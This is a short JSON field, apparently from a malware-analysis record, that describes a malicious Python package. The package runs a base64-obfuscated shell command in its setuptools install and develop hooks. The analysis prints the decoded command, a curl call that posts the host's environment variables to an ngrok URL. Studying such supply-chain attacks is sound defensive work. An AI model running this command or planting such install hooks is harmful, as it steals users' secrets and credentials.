      "malicious_behavior": "The code contains malicious behavior. It uses base64 encoding to obfuscate a shell command that is executed automatically during both the 'install' and 'develop' phases of the setuptools package installation process. The decoded command is: curl \"https://ac9c-54-204-140-51.ngrok-free.app\" -d \"env=$(env)\" which sends the environment variables of the host system to a suspicious, attacker-controlled remote URL without any user interaction or consent. This pattern of obfuscation combined with automatic execution during package installation is a hallmark of supply chain attacks and remote code execution malware. The use of a non-standard, ephemeral domain (ngrok-free.app) further indicates an attacker-controlled endpoint. There is no legitimate reason for a package installer to exfiltrate environment data to an external server silently. Therefore, this code is strongly indicative of malicious intent."
